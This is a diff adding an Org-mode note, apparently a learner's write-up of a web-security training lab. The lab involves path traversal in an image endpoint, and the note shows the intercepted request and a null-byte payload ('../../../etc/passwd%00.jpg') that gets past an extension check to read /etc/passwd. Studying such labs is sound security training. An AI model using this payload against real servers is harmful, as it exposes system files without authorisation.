@@ -1,0 +1,50 @@
+#+TITLE: File path traversal, validation of file extension with null byte bypass
+#+OPTIONS: toc:2
+
+* Table of Contents :toc:
+- [[#lab-contains][Lab Contains]]
+- [[#end-goal][End Goal]]
+- [[#solution][Solution]]
+  - [[#request][Request]]
+- [[#payload-to-solve-lab][Payload to Solve Lab]]
+
+* Lab Contains
+- path traversal in display of product images
+- validates with expected ~file extension~
+* End Goal
+- retrieve the contents of ~/etc/passwd~ file
+* DONE Solution
+CLOSED: [2023-08-06 Sun 19:27]
+- access the lab
+- open a product image on new tab of browser
+- intercept this request with proxy (burpsuite) and send it to repeater
+** Request
+#+begin_src 
+  GET /image?filename=8.jpg HTTP/2
+  Host: 0aa8005903d0c7d6807b9e1100c30078.web-security-academy.net
+  Cookie: session=BAnjPDuKUlxmz8joCXph2MfvbynPtAbI
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Dnt: 1
+  Referer: https://0aa8005903d0c7d6807b9e1100c30078.web-security-academy.net/
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  Sec-Gpc: 1
+  Te: trailers
+#+end_src
+/Here filename parameter just using filename/ 
+
+*** DONE Try with ~/etc/passwd~ payload
+CLOSED: [2023-08-06 Sun 19:27]
+- 400: *No such file*
+/So it is expecting a file with known file extension/ 
++ We can bypass with ~null byte~ technique
+
+* DONE Payload to Solve Lab
+CLOSED: [2023-08-06 Sun 19:28]
+~../../../etc/passwd%00.jpg~
